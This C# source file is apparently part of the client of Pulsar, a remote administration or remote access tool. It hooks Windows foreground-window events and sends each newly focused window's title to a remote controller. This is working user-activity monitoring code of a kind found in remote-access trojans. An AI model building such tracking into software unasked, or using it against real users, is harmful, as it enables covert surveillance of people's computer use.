﻿using System;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Pulsar.Client.Networking;
using Pulsar.Common.Messages;
using System.Runtime.InteropServices;

namespace Pulsar.Client.User
{
    //changed it so its not longer that trash thing u did where it checks every 5 secds
    // now it sends new window titled whenever a focus is chagned 
    public class ActiveWindowChecker : IDisposable
    {
        private readonly PulsarClient _client;
        private readonly CancellationTokenSource _tokenSource;
        private readonly CancellationToken _token;

        private delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

        [DllImport("user32.dll")]
        private static extern bool UnhookWinEvent(IntPtr hWinEventHook);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        private const uint WINEVENT_OUTOFCONTEXT = 0;
        private const uint EVENT_SYSTEM_FOREGROUND = 0x0003;

        private IntPtr _hookId;
        private readonly WinEventDelegate _winEventDelegate;

        public ActiveWindowChecker(PulsarClient client)
        {
            _client = client;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;

            _winEventDelegate = new WinEventDelegate(WinEventProc);
            _hookId = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, _winEventDelegate, 0, 0, WINEVENT_OUTOFCONTEXT);

            if (_hookId == IntPtr.Zero)
            {
               
            }
        }

        private void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            if (eventType == EVENT_SYSTEM_FOREGROUND)
            {
                    string currentWindowTitle = GetCurrentWindowTitle();
                    _client.Send(new SetUserActiveWindowStatus { WindowTitle = currentWindowTitle }); 
            }
        }

        private string GetCurrentWindowTitle()
        {
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, buff, nChars) > 0)
            {
                return buff.ToString();
            }
            return null;
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _tokenSource.Cancel();
                _tokenSource.Dispose();

                if (_hookId != IntPtr.Zero)
                {
                    UnhookWinEvent(_hookId);
                    _hookId = IntPtr.Zero;
                }
            }
        }
    }
}